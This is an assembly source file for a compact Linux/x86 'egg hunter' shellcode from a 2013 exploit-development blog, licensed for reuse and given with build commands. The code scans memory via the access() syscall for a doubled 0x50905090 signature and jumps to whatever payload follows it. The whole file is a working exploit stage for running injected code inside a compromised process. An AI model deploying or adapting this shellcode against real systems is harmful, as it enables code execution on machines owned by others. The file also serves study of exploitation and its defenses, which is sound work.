; Egg Hunter - Assembly Language
; Linux/x86
;
; Written in 2013 by Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This source is licensed under the Creative Commons
; Attribution-ShareAlike 3.0 Brazil License.
;
; To view a copy of this license, visit
;
;   http://creativecommons.org/licenses/by-sa/3.0/
;
; You are free:
;
;    to Share - to copy, distribute and transmit the work
;    to Remix - to adapt the work
;    to make commercial use of the work
;
; Under the following conditions:
;   Attribution - You must attribute the work in the manner
;                 specified by the author or licensor (but
;                 not in any way that suggests that they
;                 endorse you or your use of the work).
;
;   Share Alike - If you alter, transform, or build upon
;                 this work, you may distribute the
;                 resulting work only under the same or
;                 similar license to this one.
;


; egg_hunter
;
; * 39 bytes
; * null-free if the signature is
;
;
; # nasm -f elf32 egg_hunter.asm
; # ld -m elf_i386 egg_hunter.o -o egg_hunter
;
; Testing
; # ./egg_hunter


global _start

section .text

_start:
	; setting the registers
	xor esi, esi
	mul esi
alignpage:
	; align page
	or dx, 0xfff 		; is the same as "add dx, 4095" (PAGE_SIZE)
alignbyte:
	inc edx			; next memory offset

	; Accessing the memory offset
	; int access(const char *pathname, int mode);
	; access(memoryaddress, 4)

	push 33			; __NR_access 33
	pop eax

	lea ebx, [edx + 4]	; alignment to validate the last four bytes of the signature

	push esi		; F_OK 0
	pop ecx

	int 0x80		; kernel interruption


	; verifies if memory is not readable
	; as the offset is not from a path name, access will never result 0, so we have to compare the error result with 0xf2
	cmp al, 0xf2

	; if is not, loop
	jz alignpage

	; compares the signature and increments 4 bytes in edi
	mov eax, 0x50905090	; byte reverse order
	mov edi, edx
	scasd

	; if is not equal, loop
	jnz alignbyte

	; if is equal, compares the last signature 4 bytes and increments 4 bytes in edi again
	scasd

	; if is not equal, loop
	jnz alignbyte

	; if is equal, eat the egg
	jmp edi
